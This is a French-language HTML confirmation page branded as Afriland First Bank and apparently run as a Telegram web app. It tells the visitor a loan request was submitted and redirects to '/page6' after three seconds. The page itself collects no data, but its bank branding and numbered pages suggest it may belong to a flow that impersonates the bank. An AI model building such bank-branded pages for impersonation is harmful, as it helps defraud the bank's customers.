<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Demande Soumise - Afriland First Bank</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root { --primary-color: #551a8b; --bg-color: #f3eff8; }
        body { background-color: var(--bg-color); margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; font-family: -apple-system, sans-serif; }
        .toast-notification { position: absolute; top: 25px; background-color: #212833; color: #fff; padding: 12px 20px; border-radius: 12px; display: flex; align-items: center; gap: 12px; font-size: 14px; font-weight: 600; }
        .toast-icon { width: 22px; height: 22px; background-color: var(--primary-color); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; }
        .card { background: #fff; width: 90%; max-width: 420px; margin-top: 45px; padding: 40px 24px 35px; border-radius: 24px; box-shadow: 0 6px 25px rgba(85, 26, 139, 0.05); display: flex; flex-direction: column; align-items: center; text-align: center; }
        .check-circle { width: 88px; height: 88px; background-color: var(--primary-color); border-radius: 50%; display: flex; justify-content: center; align-items: center; margin-bottom: 28px; color: white; font-size: 38px; }
        .main-title { font-size: 26px; color: var(--primary-color); margin: 0 0 20px; font-weight: 800; }
        .message-text { color: #666; font-size: 15px; margin: 0 0 16px; line-height: 1.55; }
        .redirect-box { background-color: #f8f6fc; border-radius: 12px; padding: 16px 20px; margin: 20px 0 16px; width: 100%; display: flex; justify-content: center; align-items: center; gap: 10px; color: var(--primary-color); font-weight: 700; }
        .spinner { width: 18px; height: 18px; border: 2.5px solid #e0e0e0; border-top: 2.5px solid var(--primary-color); border-radius: 50%; animation: spin 0.8s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .btn-outline { background: transparent; color: #333; border: 1px solid #dcd6e4; width: 100%; padding: 14px; border-radius: 10px; font-weight: 600; cursor: pointer; }
    </style>
</head>
<body>
<div class="toast-notification">
    <div class="toast-icon">✓</div>
    <div>🎉 Demande soumise avec succès !</div>
</div>
<div class="card">
    <div class="check-circle">✓</div>
    <h1 class="main-title">Demande Soumise</h1>
    <p class="message-text">Votre demande de prêt a été soumise. Veuillez attendre l'approbation.</p>
    <div class="redirect-box">
        <div class="spinner"></div>
        <span>Redirection dans <span id="timer">3</span>s...</span>
    </div>
    <button class="btn-outline" onclick="window.location.href='/page6'">Se connecter maintenant</button>
</div>
<script>
    let timeLeft = 3;
    setInterval(() => {
        timeLeft--;
        if (timeLeft <= 0) window.location.href = "/page6";
        const el = document.getElementById('timer');
        if (el) el.textContent = timeLeft;
    }, 1000);
</script>
</body>
</html>
